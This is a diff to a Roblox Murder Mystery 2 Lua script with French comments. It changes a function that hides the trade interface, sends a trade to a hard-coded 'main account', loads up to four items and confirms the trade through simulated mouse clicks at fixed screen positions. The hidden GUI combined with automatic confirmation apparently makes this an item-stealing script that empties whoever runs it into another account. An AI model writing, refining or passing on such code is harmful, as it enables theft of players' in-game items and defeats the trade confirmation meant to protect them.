@@ -492,16 +492,16 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local VirtualUser = game:GetService("VirtualUser")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- 1. On réactive la suppression/masquage du GUI comme tu l'avais configuré
+    -- On masque le GUI si ta coroutine destroytrades2 existe
     if destroytrades2 then
-        coroutine.resume(destroytrades2)
+        pcall(function() coroutine.resume(destroytrades2) end)
     end
 
-    -- 2. Envoi de la demande de trade au compte principal
+    -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -511,7 +511,7 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2)
 
-    -- 3. Remplissage des 4 slots max de MM2
+    -- 2. Remplissage des 4 cases max de MM2
     local itemsOffered = 0
     local maxSlots = 4
 
@@ -541,49 +541,37 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 4. Première acceptation
+    -- 3. Première validation (Acceptation initiale)
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente impérative du compte à rebours MM2 (7 secondes)
+    -- 4. Attente du timer obligatoire de MM2 (7 secondes)
     task.wait(7)
 
-    -- 6. Simulation du vrai clic sur le bouton Accept (fonctionne même si le GUI est masqué/destroy)
+    -- 5. DOUBLE-CLIC VIRTUEL SUR LE BOUTON ACCEPTER
     pcall(function()
-        local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
-        if not playerGui then return end
+        local Camera = workspace.CurrentCamera
+        local ViewportSize = Camera.ViewportSize
 
-        -- Recherche du bouton Accept dans tous les conteneurs possibles de MM2
-        local acceptBtn = nil
-        for _, guiName in pairs({"TradeGUI", "TradeContainer", "Trade"}) do
-            local gui = playerGui:FindFirstChild(guiName)
-            if gui then
-                acceptBtn = gui:FindFirstChild("Accept", true) or gui:FindFirstChild("Confirm", true)
-                if acceptBtn then break end
-            end
+        -- Coordonnées exactes basées sur ton écran
+        local targetX = ViewportSize.X * 0.76
+        local targetY = ViewportSize.Y * 0.74
+
+        local function sendClick()
+            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
+            task.wait(0.1)
+            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        if acceptBtn then
-            -- A) Si l'exécuteur supporte getconnections, on déclenche les événements du bouton
-            if getconnections then
-                for _, conn in pairs(getconnections(acceptBtn.MouseButton1Click)) do
-                    conn:Fire()
-                end
-                for _, conn in pairs(getconnections(acceptBtn.MouseButton1Down)) do
-                    conn:Fire()
-                end
-            end
+        -- Premier clic (Passe le bouton en vert / verrouille l'offre)
+        sendClick()
 
-            -- B) Simulation de clic physique par coordonnées d'écran (VirtualUser)
-            VirtualUser:CaptureController()
-            local posX = acceptBtn.AbsolutePosition.X + (acceptBtn.AbsoluteSize.X / 2)
-            local posY = acceptBtn.AbsolutePosition.Y + (acceptBtn.AbsoluteSize.Y / 2) + 36 -- +36 pour décaler la barre Roblox Supérieure
-            VirtualUser:ClickButton1(Vector2.new(posX, posY))
-        else
-            -- C) Secours RemoteEvent si le bouton a été totalement supprimé de la mémoire
-            Trade.AcceptTrade:FireServer()
-        end
+        -- Petite pause de 1.5 seconde
+        task.wait(1.5)
+
+        -- Deuxième clic (Validation définitive du trade)
+        sendClick()
     end)
 end
 
